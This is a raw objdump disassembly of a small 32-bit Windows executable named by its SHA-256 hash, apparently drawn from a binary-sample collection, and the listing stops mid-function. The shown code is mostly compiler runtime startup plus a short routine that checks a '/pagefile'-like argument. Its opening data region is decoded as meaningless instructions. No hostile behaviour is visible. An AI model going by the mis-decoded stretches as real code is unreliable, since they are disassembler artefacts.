
89441cca04cfaebcacaa194a59d78e1fee62fc3c608704401a2dd1035d71d8de.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	jo     0x40101a
  401006:	inc    eax
	...
  40100f:	add    BYTE PTR [eax+0x70004013],ah
  401015:	pop    ss
  401016:	inc    eax
  401017:	add    BYTE PTR [eax],al
  401019:	add    BYTE PTR [eax],al
  40101b:	add    BYTE PTR [eax+0x70000013],ah
  401021:	adc    al,0x0
  401023:	add    al,dh
  401025:	push   ss
  401026:	add    BYTE PTR [eax],al
  401028:	add    BYTE PTR [edi],dl
  40102a:	add    BYTE PTR [eax],al
  40102c:	and    BYTE PTR [edi],dl
  40102e:	add    BYTE PTR [eax],al
  401030:	jo     0x401049
  401032:	add    BYTE PTR [eax],al
  401034:	push   eax
  401035:	sbb    BYTE PTR [eax],al
  401037:	add    al,ah
  401039:	sbb    al,BYTE PTR [eax]
  40103b:	add    BYTE PTR [eax],dl
  40103d:	sbb    eax,DWORD PTR [eax]
  40103f:	add    BYTE PTR [eax+0x20],al
  401042:	inc    eax
  401043:	add    BYTE PTR [eax+0x2f004020],dl
  401049:	add    BYTE PTR [eax+0x0],dh
  40104c:	popa   
  40104d:	add    BYTE PTR [edi+0x0],ah
  401050:	add    BYTE PTR gs:[esi+0x0],ah
  401054:	imul   eax,DWORD PTR [eax],0x65006c
  40105a:	add    BYTE PTR [eax],al
  40105c:	push   eax
  40105d:	add    BYTE PTR [ecx+0x0],al
  401060:	inc    edi
  401061:	add    BYTE PTR [ebp+0x0],al
  401064:	inc    esi
  401065:	add    BYTE PTR [ecx+0x0],cl
  401068:	dec    esp
  401069:	add    BYTE PTR [ebp+0x0],al
  40106c:	add    BYTE PTR [eax],al
  40106e:	add    BYTE PTR [eax],al
  401070:	sub    eax,0x3100
	...
  401081:	add    BYTE PTR [eax],al
  401083:	add    BYTE PTR [esp+edi*1-0x61],cl
  401087:	push   ebp
  401088:	add    BYTE PTR [eax],al
  40108a:	add    BYTE PTR [eax],al
  40108c:	add    al,BYTE PTR [eax]
  40108e:	add    BYTE PTR [eax],al
  401090:	cmp    BYTE PTR [eax],al
  401092:	add    BYTE PTR [eax],al
  401094:	inc    esp
  401095:	adc    DWORD PTR [eax],eax
  401097:	add    BYTE PTR [ebp+eax*1+0x0],al
  40109b:	add    BYTE PTR [eax],al
  40109d:	add    BYTE PTR [eax],al
  40109f:	add    BYTE PTR [esp+edi*1-0x61],cl
  4010a3:	push   ebp
  4010a4:	add    BYTE PTR [eax],al
  4010a6:	add    BYTE PTR [eax],al
  4010a8:	or     eax,0xc8000000
  4010ad:	add    DWORD PTR [eax],eax
  4010af:	add    BYTE PTR [eax-0x6fffffef],dl
  4010b5:	add    eax,0x0
	...
  4010d6:	add    BYTE PTR [eax],al
  4010d8:	push   0x0
	...
  401111:	add    BYTE PTR [eax],al
  401113:	add    BYTE PTR [eax+eiz*1],al
  401116:	inc    eax
  401117:	add    BYTE PTR [eax+0x11],al
  40111a:	inc    eax
  40111b:	add    BYTE PTR [ecx],al
  40111d:	add    BYTE PTR [eax],al
  40111f:	add    BYTE PTR [eax+0x4030],bl
  401125:	add    BYTE PTR [eax],al
  401127:	add    BYTE PTR [eax+edx*1],bl
  40112a:	inc    eax
  40112b:	add    BYTE PTR [ecx],cl
  40112d:	add    BYTE PTR [eax],al
  40112f:	add    BYTE PTR [eax],al
  401131:	xor    eax,0x0
	...
  40113e:	add    BYTE PTR [eax],al
  401140:	loopne 0x40115c
  401142:	add    BYTE PTR [eax],al
  401144:	push   edx
  401145:	push   ebx
  401146:	inc    esp
  401147:	push   ebx
  401148:	pop    esi
  401149:	mov    ch,0x2f
  40114b:	mov    ebp,0x4f8efb8e
  401150:	mov    ah,0xef
  401152:	lea    esp,[edx+0x1e]
  401155:	xchg   edi,eax
  401156:	xor    al,0x88
  401158:	add    DWORD PTR [eax],eax
  40115a:	add    BYTE PTR [eax],al
  40115c:	push   ebx
  40115d:	jns    0x4011d2
  40115f:	je     0x4011c6
  401161:	ins    DWORD PTR es:[edi],dx
  401162:	push   eax
  401163:	jb     0x4011d4
  401165:	jo     0x4011cc
  401167:	jb     0x4011dd
  401169:	imul   esp,DWORD PTR [ebp+0x73],0x66726550
  401170:	outs   dx,DWORD PTR ds:[esi]
  401171:	jb     0x4011e0
  401173:	popa   
  401174:	outs   dx,BYTE PTR ds:[esi]
  401175:	arpl   WORD PTR [ebp+0x2e],sp
  401178:	jo     0x4011de
  40117a:	bound  eax,QWORD PTR [eax]
	...
  401190:	inc    edi
  401191:	inc    ebx
  401192:	push   esp
  401193:	dec    esp
  401194:	add    BYTE PTR [eax],dl
  401196:	add    BYTE PTR [eax],al
  401198:	add    al,0x0
  40119a:	add    BYTE PTR [eax],al
  40119c:	cs inc ebx
  40119e:	push   edx
  40119f:	push   esp
  4011a0:	and    al,0x58
  4011a2:	inc    ebx
  4011a3:	inc    ecx
  4011a4:	add    BYTE PTR [eax],al
  4011a6:	add    BYTE PTR [eax],al
  4011a8:	add    al,0x10
  4011aa:	add    BYTE PTR [eax],al
  4011ac:	add    al,0x0
  4011ae:	add    BYTE PTR [eax],al
  4011b0:	cs inc ebx
  4011b2:	push   edx
  4011b3:	push   esp
  4011b4:	and    al,0x58
  4011b6:	inc    ebx
  4011b7:	inc    ecx
  4011b8:	inc    ecx
  4011b9:	add    BYTE PTR [eax],al
  4011bb:	add    BYTE PTR [eax],cl
  4011bd:	adc    BYTE PTR [eax],al
  4011bf:	add    BYTE PTR [eax+eax*1],al
  4011c2:	add    BYTE PTR [eax],al
  4011c4:	cs inc ebx
  4011c6:	push   edx
  4011c7:	push   esp
  4011c8:	and    al,0x58
  4011ca:	inc    ebx
  4011cb:	pop    edx
  4011cc:	add    BYTE PTR [eax],al
  4011ce:	add    BYTE PTR [eax],al
  4011d0:	or     al,0x10
  4011d2:	add    BYTE PTR [eax],al
  4011d4:	add    al,0x0
  4011d6:	add    BYTE PTR [eax],al
  4011d8:	cs inc ebx
  4011da:	push   edx
  4011db:	push   esp
  4011dc:	and    al,0x58
  4011de:	dec    ecx
  4011df:	inc    ecx
  4011e0:	add    BYTE PTR [eax],al
  4011e2:	add    BYTE PTR [eax],al
  4011e4:	adc    BYTE PTR [eax],dl
  4011e6:	add    BYTE PTR [eax],al
  4011e8:	add    al,0x0
  4011ea:	add    BYTE PTR [eax],al
  4011ec:	cs inc ebx
  4011ee:	push   edx
  4011ef:	push   esp
  4011f0:	and    al,0x58
  4011f2:	dec    ecx
  4011f3:	inc    ecx
  4011f4:	inc    ecx
  4011f5:	add    BYTE PTR [eax],al
  4011f7:	add    BYTE PTR [eax+edx*1],dl
  4011fa:	add    BYTE PTR [eax],al
  4011fc:	add    al,0x0
  4011fe:	add    BYTE PTR [eax],al
  401200:	cs inc ebx
  401202:	push   edx
  401203:	push   esp
  401204:	and    al,0x58
  401206:	dec    ecx
  401207:	pop    ecx
  401208:	add    BYTE PTR [eax],al
  40120a:	add    BYTE PTR [eax],al
  40120c:	sbb    BYTE PTR [eax],dl
  40120e:	add    BYTE PTR [eax],al
  401210:	add    al,0x0
  401212:	add    BYTE PTR [eax],al
  401214:	cs inc ebx
  401216:	push   edx
  401217:	push   esp
  401218:	and    al,0x58
  40121a:	dec    ecx
  40121b:	pop    edx
  40121c:	add    BYTE PTR [eax],al
  40121e:	add    BYTE PTR [eax],al
  401220:	sbb    al,0x10
  401222:	add    BYTE PTR [eax],al
  401224:	and    al,0x0
  401226:	add    BYTE PTR [eax],al
  401228:	imul   sp,WORD PTR cs:[si+0x73],0x7824
  401230:	add    BYTE PTR [eax],al
  401232:	add    BYTE PTR [eax],al
  401234:	inc    eax
  401235:	adc    BYTE PTR [eax],al
  401237:	add    BYTE PTR [eax],al
  401239:	add    DWORD PTR [eax],eax
  40123b:	add    BYTE PTR [esi],ch
  40123d:	jb     0x4012a3
  40123f:	popa   
  401240:	je     0x4012a3
  401242:	add    BYTE PTR [eax],al
  401244:	inc    eax
  401245:	adc    DWORD PTR [eax],eax
  401247:	add    BYTE PTR [eax+eax*1],al
  40124a:	add    BYTE PTR [eax],al
  40124c:	cs jb  0x4012b3
  40124f:	popa   
  401250:	je     0x4012b3
  401252:	and    al,0x73
  401254:	js     0x4012ba
  401256:	popa   
  401257:	je     0x4012ba
  401259:	add    BYTE PTR [eax],al
  40125b:	add    BYTE PTR [ecx+edx*1+0x0],al
  40125f:	add    BYTE PTR [edx+eax*1],dl
  401262:	add    BYTE PTR [eax],al
  401264:	cs jb  0x4012cb
  401267:	popa   
  401268:	je     0x4012cb
  40126a:	and    al,0x7a
  40126c:	jp     0x4012e8
  40126e:	bound  esp,QWORD PTR fs:[edi+0x0]
  401272:	add    BYTE PTR [eax],al
  401274:	pusha  
  401275:	adc    eax,DWORD PTR [eax]
  401277:	add    BYTE PTR [eax+0x9],ah
  40127a:	add    BYTE PTR [eax],al
  40127c:	cs je  0x4012e4
  40127f:	js     0x4012f5
  401281:	and    al,0x6d
  401283:	outs   dx,BYTE PTR ds:[esi]
  401284:	add    BYTE PTR [eax],al
  401286:	add    BYTE PTR [eax],al
  401288:	rcr    BYTE PTR [eax+eax*1],0x0
  40128c:	add    BYTE PTR fs:[eax],al
  40128f:	add    BYTE PTR [esi],ch
  401291:	js     0x4012f7
  401293:	popa   
  401294:	je     0x4012f7
  401296:	and    al,0x78
  401298:	add    BYTE PTR [eax],al
  40129a:	add    BYTE PTR [eax],al
  40129c:	add    BYTE PTR [eax],ah
  40129e:	add    BYTE PTR [eax],al
  4012a0:	or     al,0x0
  4012a2:	add    BYTE PTR [eax],al
  4012a4:	cs fs popa 
  4012a7:	je     0x40130a
  4012a9:	add    BYTE PTR [eax],al
  4012ab:	add    BYTE PTR [eax],dl
  4012ad:	and    BYTE PTR [eax],al
  4012af:	add    BYTE PTR [eax+0x3],ah
  4012b2:	add    BYTE PTR [eax],al
  4012b4:	bound  esi,QWORD PTR cs:[ebx+0x73]
  4012b8:	add    BYTE PTR [eax],al
  4012ba:	add    BYTE PTR [eax],al
  4012bc:	add    BYTE PTR [eax],dh
  4012be:	add    BYTE PTR [eax],al
  4012c0:	cwde   
  4012c1:	add    BYTE PTR [eax],al
  4012c3:	add    BYTE PTR [esi],ch
  4012c5:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x352461
  4012cd:	add    BYTE PTR [eax],al
  4012cf:	add    BYTE PTR [eax+0x4000030],bl
  4012d5:	add    BYTE PTR [eax],al
  4012d7:	add    BYTE PTR [esi],ch
  4012d9:	xor    BYTE PTR [eax],dh
  4012db:	arpl   WORD PTR [esi+0x67],sp
  4012de:	add    BYTE PTR [eax],al
  4012e0:	pushf  
  4012e1:	xor    BYTE PTR [eax],al
  4012e3:	add    BYTE PTR [eax+eax*1+0x692e0000],dh
  4012ea:	fs popa 
  4012ec:	je     0x40134f
  4012ee:	and    al,0x32
  4012f0:	add    BYTE PTR [eax],al
  4012f2:	add    BYTE PTR [eax],al
  4012f4:	push   eax
  4012f5:	xor    DWORD PTR [eax],eax
  4012f7:	add    BYTE PTR [eax+eax*1],dl
  4012fa:	add    BYTE PTR [eax],al
  4012fc:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x332461
  401305:	add    BYTE PTR [eax],al
  401307:	add    BYTE PTR [ecx+esi*1+0x0],ah
  40130b:	add    BYTE PTR [eax+0x2e000000],bl
  401311:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x342461
  401319:	add    BYTE PTR [eax],al
  40131b:	add    ah,bh
  40131d:	xor    DWORD PTR [eax],eax
  40131f:	add    BYTE PTR [ebx+eax*1],dl
  401322:	add    BYTE PTR [eax],al
  401324:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x362461
  40132d:	add    BYTE PTR [eax],al
  40132f:	add    BYTE PTR [eax],al
  401331:	inc    eax
  401332:	add    BYTE PTR [eax],al
  401334:	xor    BYTE PTR [ebx],al
  401336:	add    BYTE PTR [eax],al
  401338:	cs jb  0x4013ae
  40133b:	jb     0x4013a0
  40133d:	and    al,0x30
  40133f:	xor    DWORD PTR [eax],eax
  401341:	add    BYTE PTR [eax],al
  401343:	add    BYTE PTR [eax],dh
  401345:	inc    ebx
  401346:	add    BYTE PTR [eax],al
  401348:	sbb    BYTE PTR [ecx+eax*1],ah
  40134b:	add    BYTE PTR [esi],ch
  40134d:	jb     0x4013c2
  40134f:	jb     0x4013b4
  401351:	and    al,0x30
  401353:	xor    al,BYTE PTR [eax]
	...
  401365:	mov    edi,edi
  401367:	push   ebp
  401368:	mov    ebp,esp
  40136a:	push   0x1
  40136c:	push   0xffffffff
  40136e:	push   0x401048
  401373:	push   0xffffffff
  401375:	push   DWORD PTR [ebp+0x10]
  401378:	call   DWORD PTR ds:0x403000
  40137e:	cmp    eax,0x2
  401381:	jne    0x40138a
  401383:	push   0x40105c
  401388:	jmp    0x40138f
  40138a:	push   0x401070
  40138f:	call   DWORD PTR ds:0x403008
  401395:	xor    eax,eax
  401397:	pop    ebp
  401398:	ret    0x10
  40139b:	int3   
  40139c:	int3   
  40139d:	int3   
  40139e:	int3   
  40139f:	int3   
  4013a0:	mov    eax,0x5a4d
  4013a5:	cmp    WORD PTR ds:0x400000,ax
  4013ac:	je     0x4013b2
  4013ae:	xor    eax,eax
  4013b0:	jmp    0x401400
  4013b2:	mov    ecx,DWORD PTR ds:0x40003c
  4013b8:	cmp    DWORD PTR [ecx+0x400000],0x4550
  4013c2:	jne    0x4013ae
  4013c4:	movzx  eax,WORD PTR [ecx+0x400018]
  4013cb:	cmp    eax,0x10b
  4013d0:	je     0x4013ec
  4013d2:	cmp    eax,0x20b
  4013d7:	jne    0x4013ae
  4013d9:	xor    eax,eax
  4013db:	cmp    DWORD PTR [ecx+0x400084],0xe
  4013e2:	jbe    0x401400
  4013e4:	cmp    DWORD PTR [ecx+0x4000f8],eax
  4013ea:	jmp    0x4013fd
  4013ec:	xor    eax,eax
  4013ee:	cmp    DWORD PTR [ecx+0x400074],0xe
  4013f5:	jbe    0x401400
  4013f7:	cmp    DWORD PTR [ecx+0x4000e8],eax
  4013fd:	setne  al
  401400:	push   0x2
  401402:	mov    ds:0x402028,eax
  401407:	call   0x4017fe
  40140c:	push   eax
  40140d:	call   DWORD PTR ds:0x403080
  401413:	or     DWORD PTR ds:0x40235c,0xffffffff
  40141a:	or     DWORD PTR ds:0x402360,0xffffffff
  401421:	pop    ecx
  401422:	pop    ecx
  401423:	call   DWORD PTR ds:0x403070
  401429:	mov    ecx,DWORD PTR ds:0x40203c
  40142f:	mov    DWORD PTR [eax],ecx
  401431:	call   DWORD PTR ds:0x40308c
  401437:	mov    ecx,DWORD PTR ds:0x402030
  40143d:	mov    DWORD PTR [eax],ecx
  40143f:	call   0x401850
  401444:	cmp    DWORD PTR ds:0x402000,0x0
  40144b:	jne    0x401459
  40144d:	push   0x401850
  401452:	call   DWORD PTR ds:0x40306c
  401458:	pop    ecx
  401459:	call   0x401a5f
  40145e:	xor    eax,eax
  401460:	ret    
  401461:	int3   
  401462:	int3   
  401463:	int3   
  401464:	int3   
  401465:	int3   
  401466:	int3   
  401467:	int3   
  401468:	int3   
  401469:	int3   
  40146a:	int3   
  40146b:	int3   
  40146c:	int3   
  40146d:	int3   
  40146e:	int3   
  40146f:	int3   
  401470:	mov    eax,ds:0x402038
  401475:	push   0x40202c
  40147a:	push   DWORD PTR ds:0x402034
  401480:	mov    ds:0x40202c,eax
  401485:	push   0x402020
  40148a:	push   0x40201c
  40148f:	push   0x402018
  401494:	call   DWORD PTR ds:0x403084
  40149a:	add    esp,0x14
  40149d:	mov    ds:0x402024,eax
  4014a2:	ret    
  4014a3:	int3   
  4014a4:	int3   
  4014a5:	int3   
  4014a6:	int3   
  4014a7:	int3   
  4014a8:	push   0x5c
  4014aa:	push   0x401cc0
  4014af:	call   0x401a84
  4014b4:	and    DWORD PTR [ebp-0x24],0x0
  4014b8:	and    DWORD PTR [ebp-0x4],0x0
  4014bc:	lea    eax,[ebp-0x6c]
  4014bf:	push   eax
  4014c0:	call   DWORD PTR ds:0x403024
  4014c6:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4014cd:	xor    ebx,ebx
  4014cf:	inc    ebx
  4014d0:	mov    DWORD PTR [ebp-0x4],ebx
  4014d3:	mov    eax,fs:0x18
  4014d9:	mov    edi,DWORD PTR [eax+0x4]
  4014dc:	xor    esi,esi
  4014de:	mov    edx,0x402364
  4014e3:	mov    ecx,edi
  4014e5:	xor    eax,eax
  4014e7:	lock cmpxchg DWORD PTR [edx],ecx
  4014eb:	test   eax,eax
  4014ed:	je     0x4014f5
  4014ef:	cmp    eax,edi
  4014f1:	jne    0x401507
  4014f3:	mov    esi,ebx
  4014f5:	cmp    DWORD PTR ds:0x402368,ebx
  4014fb:	jne    0x401514
  4014fd:	push   0x1f
  4014ff:	call   0x40183a
  401504:	pop    ecx
  401505:	jmp    0x401543
  401507:	push   0x3e8
  40150c:	call   DWORD PTR ds:0x403044
  401512:	jmp    0x4014de
  401514:	cmp    DWORD PTR ds:0x402368,0x0
  40151b:	jne    0x40153d
  40151d:	mov    DWORD PTR ds:0x402368,ebx
  401523:	push   0x401018
  401528:	push   0x40100c
  40152d:	call   0x401694
  401532:	pop    ecx
  401533:	pop    ecx
  401534:	test   eax,eax
  401536:	je     0x401543
  401538:	jmp    0x40167d
  40153d:	mov    DWORD PTR ds:0x402014,ebx
  401543:	cmp    DWORD PTR ds:0x402368,ebx
  401549:	jne    0x401566
  40154b:	push   0x401008
  401550:	push   0x401000
  401555:	call   0x401a78
  40155a:	pop    ecx
  40155b:	pop    ecx
  40155c:	mov    DWORD PTR ds:0x402368,0x2
  401566:	test   esi,esi
  401568:	jne    0x401573
  40156a:	xor    eax,eax
  40156c:	mov    ecx,0x402364
  401571:	xchg   DWORD PTR [ecx],eax
  401573:	cmp    DWORD PTR ds:0x40236c,0x0
  40157a:	je     0x4015a1
  40157c:	push   0x40236c
  401581:	call   0x4018b0
  401586:	pop    ecx
  401587:	test   eax,eax
  401589:	je     0x4015a1
  40158b:	push   0x0
  40158d:	push   0x2
  40158f:	push   0x0
  401591:	mov    esi,DWORD PTR ds:0x40236c
  401597:	mov    ecx,esi
  401599:	call   DWORD PTR ds:0x403098
  40159f:	call   esi
  4015a1:	mov    eax,ds:0x403064
  4015a6:	mov    ecx,DWORD PTR [eax]
  4015a8:	test   ecx,ecx
  4015aa:	je     0x40167d
  4015b0:	mov    DWORD PTR [ebp-0x20],ecx
  4015b3:	push   0x20
  4015b5:	pop    esi
  4015b6:	mov    edx,DWORD PTR [ebp-0x24]
  4015b9:	movzx  eax,WORD PTR [ecx]
  4015bc:	cmp    ax,si
  4015bf:	ja     0x401611
  4015c1:	test   ax,ax
  4015c4:	je     0x4015ca
  4015c6:	test   edx,edx
  4015c8:	jne    0x401611
  4015ca:	movzx  eax,WORD PTR [ecx]
  4015cd:	test   ax,ax
  4015d0:	je     0x4015df
  4015d2:	cmp    ax,si
  4015d5:	ja     0x4015df
  4015d7:	add    ecx,0x2
  4015da:	mov    DWORD PTR [ebp-0x20],ecx
  4015dd:	jmp    0x4015ca
  4015df:	test   BYTE PTR [ebp-0x40],0x1
  4015e3:	je     0x4015eb
  4015e5:	movzx  eax,WORD PTR [ebp-0x3c]
  4015e9:	jmp    0x4015ee
  4015eb:	push   0xa
  4015ed:	pop    eax
  4015ee:	push   eax
  4015ef:	push   ecx
  4015f0:	push   0x0
  4015f2:	push   0x400000
  4015f7:	call   0x401365
  4015fc:	mov    ds:0x402010,eax
  401601:	cmp    DWORD PTR ds:0x402028,0x0
  401608:	jne    0x401659
  40160a:	push   eax
  40160b:	call   DWORD PTR ds:0x40307c
  401611:	cmp    eax,0x22
  401614:	jne    0x401622
  401616:	xor    eax,eax
  401618:	test   edx,edx
  40161a:	sete   al
  40161d:	mov    edx,eax
  40161f:	mov    DWORD PTR [ebp-0x24],edx
  401622:	add    ecx,0x2
  401625:	mov    DWORD PTR [ebp-0x20],ecx
  401628:	jmp    0x4015b9
  40162a:	mov    ecx,DWORD PTR [ebp-0x14]
  40162d:	mov    eax,DWORD PTR [ecx]
  40162f:	mov    eax,DWORD PTR [eax]
  401631:	mov    DWORD PTR [ebp-0x28],eax
  401634:	push   ecx
  401635:	push   eax
  401636:	call   0x401784
  40163b:	pop    ecx
  40163c:	pop    ecx
  40163d:	ret    
  40163e:	mov    esp,DWORD PTR [ebp-0x18]
  401641:	mov    eax,DWORD PTR [ebp-0x28]
  401644:	mov    ds:0x402010,eax
  401649:	cmp    DWORD PTR ds:0x402028,0x0
  401650:	jne    0x401659
  401652:	push   eax
  401653:	call   DWORD PTR ds:0x403078
  401659:	cmp    DWORD PTR ds:0x402014,0x0
  401660:	jne    0x40166d
  401662:	call   DWORD PTR ds:0x403074
  401668:	mov    eax,ds:0x402010
  40166d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401674:	jmp    0x401689
  401676:	xor    eax,eax
  401678:	inc    eax
  401679:	ret    
  40167a:	mov    esp,DWORD PTR [ebp-0x18]
  40167d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  401684:	mov    eax,0xff
  401689:	call   0x401acc
  40168e:	ret    
  40168f:	int3   
  401690:	int3   
  401691:	int3   
  401692:	int3   
  401693:	int3   
  401694:	mov    edi,edi
  401696:	push   ebp
  401697:	mov    ebp,esp
  401699:	push   ecx
  40169a:	mov    eax,ds:0x402004
  40169f:	xor    eax,ebp
  4016a1:	mov    DWORD PTR [ebp-0x4],eax
  4016a4:	push   esi
  4016a5:	mov    esi,DWORD PTR [ebp+0x8]
  4016a8:	xor    eax,eax
  4016aa:	cmp    esi,DWORD PTR [ebp+0xc]
  4016ad:	jae    0x4016cd
  4016af:	push   edi
  4016b0:	test   eax,eax
  4016b2:	jne    0x4016cc
  4016b4:	mov    edi,DWORD PTR [esi]
  4016b6:	test   edi,edi
  4016b8:	je     0x4016c4
  4016ba:	mov    ecx,edi
  4016bc:	call   DWORD PTR ds:0x403098
  4016c2:	call   edi
  4016c4:	add    esi,0x4
  4016c7:	cmp    esi,DWORD PTR [ebp+0xc]
  4016ca:	jb     0x4016b0
  4016cc:	pop    edi
  4016cd:	mov    ecx,DWORD PTR [ebp-0x4]
  4016d0:	xor    ecx,ebp
  4016d2:	pop    esi
  4016d3:	call   0x401700
  4016d8:	mov    esp,ebp
  4016da:	pop    ebp
  4016db:	ret    
  4016dc:	int3   
  4016dd:	int3   
  4016de:	int3   
  4016df:	int3   
  4016e0:	int3   
  4016e1:	int3   
  4016e2:	int3   
  4016e3:	int3   
  4016e4:	int3   
  4016e5:	int3   
  4016e6:	int3   
  4016e7:	int3   
  4016e8:	int3   
  4016e9:	int3   
  4016ea:	int3   
  4016eb:	int3   
  4016ec:	int3   
  4016ed:	int3   
  4016ee:	int3   
  4016ef:	int3   
  4016f0:	call   0x4019b8
  4016f5:	jmp    0x4014a8
  4016fa:	int3   
  4016fb:	int3   
  4016fc:	int3   
  4016fd:	int3   
  4016fe:	int3   
  4016ff:	int3   
  401700:	cmp    ecx,DWORD PTR ds:0x402004
  401706:	jne    0x40170b
  401708:	ret    0x0
  40170b:	jmp    0x401b45
  401710:	int3   
  401711:	int3   
  401712:	int3   
  401713:	int3   
  401714:	int3   
  401715:	int3   
  401716:	int3   
  401717:	int3   
  401718:	int3   
  401719:	int3   
  40171a:	int3   
  40171b:	int3   
  40171c:	int3   
  40171d:	int3   
  40171e:	int3   
  40171f:	int3   
  401720:	mov    edi,edi
  401722:	push   ebp
  401723:	mov    ebp,esp
  401725:	mov    eax,DWORD PTR [ebp+0x8]
  401728:	mov    eax,DWORD PTR [eax]
  40172a:	cmp    DWORD PTR [eax],0xe06d7363
  401730:	jne    0x40175d
  401732:	cmp    DWORD PTR [eax+0x10],0x3
  401736:	jne    0x40175d
  401738:	mov    eax,DWORD PTR [eax+0x14]
  40173b:	cmp    eax,0x19930520
  401740:	je     0x401757
  401742:	cmp    eax,0x19930521
  401747:	je     0x401757
  401749:	cmp    eax,0x19930522
  40174e:	je     0x401757
  401750:	cmp    eax,0x1994000
  401755:	jne    0x40175d
  401757:	call   DWORD PTR ds:0x403060
  40175d:	xor    eax,eax
  40175f:	pop    ebp
  401760:	ret    0x4
  401763:	int3   
  401764:	int3   
  401765:	int3   
  401766:	int3   
  401767:	int3   
  401768:	int3   
  401769:	int3   
  40176a:	int3   
  40176b:	int3   
  40176c:	int3   
  40176d:	int3   
  40176e:	int3   
  40176f:	int3   
  401770:	push   0x401720
  401775:	call   DWORD PTR ds:0x403010
  40177b:	xor    eax,eax
  40177d:	ret    
  40177e:	int3   
  40177f:	int3   
  401780:	int3   
  401781:	int3   
  401782:	int3   
  401783:	int3   
  401784:	jmp    DWORD PTR ds:0x403090
  40178a:	int3   
  40178b:	int3   
  40178c:	int3   
  40178d:	int3   
  40178e:	int3   
  40178f:	push   0xc
  401791:	push   0x401ce8
  401796:	call   0x401c5c
  40179b:	xor    ecx,ecx
  40179d:	mov    eax,DWORD PTR [ebp+0x8]
  4017a0:	test   eax,eax
  4017a2:	je     0x4017ef
  4017a4:	cmp    eax,0xffffffff
  4017a7:	je     0x4017ef
  4017a9:	mov    DWORD PTR [ebp-0x4],ecx
  4017ac:	mov    edx,0x5a4d
  4017b1:	cmp    WORD PTR [eax],dx
  4017b4:	jne    0x4017e8
  4017b6:	mov    edx,DWORD PTR [eax+0x3c]
  4017b9:	test   edx,edx
  4017bb:	js     0x4017e8
  4017bd:	cmp    edx,0x10000000
  4017c3:	jae    0x4017e8
  4017c5:	add    eax,edx
  4017c7:	mov    DWORD PTR [ebp-0x1c],eax
  4017ca:	mov    ecx,DWORD PTR [eax]
  4017cc:	sub    ecx,0x4550
  4017d2:	neg    ecx
  4017d4:	sbb    ecx,ecx
  4017d6:	not    ecx
  4017d8:	and    ecx,eax
  4017da:	jmp    0x4017e5
  4017dc:	xor    eax,eax
  4017de:	inc    eax
  4017df:	ret    
  4017e0:	mov    esp,DWORD PTR [ebp-0x18]
  4017e3:	xor    ecx,ecx
  4017e5:	mov    DWORD PTR [ebp-0x1c],ecx
  4017e8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4017ef:	mov    eax,ecx
  4017f1:	call   0x401ca1
  4017f6:	ret    0x4
  4017f9:	int3   
  4017fa:	int3   
  4017fb:	int3   
  4017fc:	int3   
  4017fd:	int3   
  4017fe:	mov    edi,edi
  401800:	push   ebp
  401801:	mov    ebp,esp
  401803:	push   0x0
  401805:	call   DWORD PTR ds:0x40301c
  40180b:	test   eax,eax
  40180d:	je     0x40182f
  40180f:	push   eax
  401810:	call   0x40178f
  401815:	test   eax,eax
  401817:	je     0x40182f
  401819:	movzx  ecx,WORD PTR [eax+0x5c]
  40181d:	push   0x2
  40181f:	pop    eax
  401820:	cmp    cx,ax
  401823:	je     0x401832
  401825:	cmp    ecx,0x3
  401828:	jne    0x40182f
  40182a:	xor    eax,eax
  40182c:	inc    eax
  40182d:	pop    ebp
  40182e:	ret    
  40182f:	mov    eax,DWORD PTR [ebp+0x8]
  401832:	pop    ebp
  401833:	ret    
  401834:	int3   
  401835:	int3   
  401836:	int3   
  401837:	int3   
  401838:	int3   
  401839:	int3   
  40183a:	jmp    DWORD PTR ds:0x403088
  401840:	int3   
  401841:	int3   
  401842:	int3   
  401843:	int3   
  401844:	int3   
  401845:	int3   
  401846:	int3   
  401847:	int3   
  401848:	int3   
  401849:	int3   
  40184a:	int3   
  40184b:	int3   
  40184c:	int3   
  40184d:	int3   
  40184e:	int3   
  40184f:	int3   
  401850:	xor    eax,eax
  401852:	ret    
  401853:	int3   
  401854:	int3   
  401855:	int3   
  401856:	int3   
  401857:	int3   
  401858:	int3   
  401859:	int3   
  40185a:	int3   
  40185b:	int3   
  40185c:	int3   
  40185d:	int3   
  40185e:	int3   
  40185f:	int3   
  401860:	mov    edi,edi
  401862:	push   ebp
  401863:	mov    ebp,esp
  401865:	mov    eax,DWORD PTR [ebp+0x8]
  401868:	xor    edx,edx
  40186a:	push   ebx
  40186b:	push   esi
  40186c:	push   edi
  40186d:	mov    ecx,DWORD PTR [eax+0x3c]
  401870:	add    ecx,eax
  401872:	movzx  eax,WORD PTR [ecx+0x14]
  401876:	movzx  ebx,WORD PTR [ecx+0x6]
  40187a:	add    eax,0x18
  40187d:	add    eax,ecx
  40187f:	test   ebx,ebx
  401881:	je     0x40189e
  401883:	mov    edi,DWORD PTR [ebp+0xc]
  401886:	mov    esi,DWORD PTR [eax+0xc]
  401889:	cmp    edi,esi
  40188b:	jb     0x401896
  40188d:	mov    ecx,DWORD PTR [eax+0x8]
  401890:	add    ecx,esi
  401892:	cmp    edi,ecx
  401894:	jb     0x4018a0
  401896:	inc    edx
  401897:	add    eax,0x28
  40189a:	cmp    edx,ebx
  40189c:	jb     0x401886
  40189e:	xor    eax,eax
  4018a0:	pop    edi
  4018a1:	pop    esi
  4018a2:	pop    ebx
  4018a3:	pop    ebp
  4018a4:	ret    
  4018a5:	int3   
  4018a6:	int3   
  4018a7:	int3   
  4018a8:	int3   
  4018a9:	int3   
  4018aa:	int3   
  4018ab:	int3   
  4018ac:	int3   
  4018ad:	int3   
  4018ae:	int3   
  4018af:	int3   
  4018b0:	mov    edi,edi
  4018b2:	push   ebp
  4018b3:	mov    ebp,esp
  4018b5:	push   0xfffffffe
  4018b7:	push   0x401d08
  4018bc:	push   0x401ae0
  4018c1:	mov    eax,fs:0x0
  4018c7:	push   eax
  4018c8:	sub    esp,0x8
  4018cb:	push   ebx
  4018cc:	push   esi
  4018cd:	push   edi
  4018ce:	mov    eax,ds:0x402004
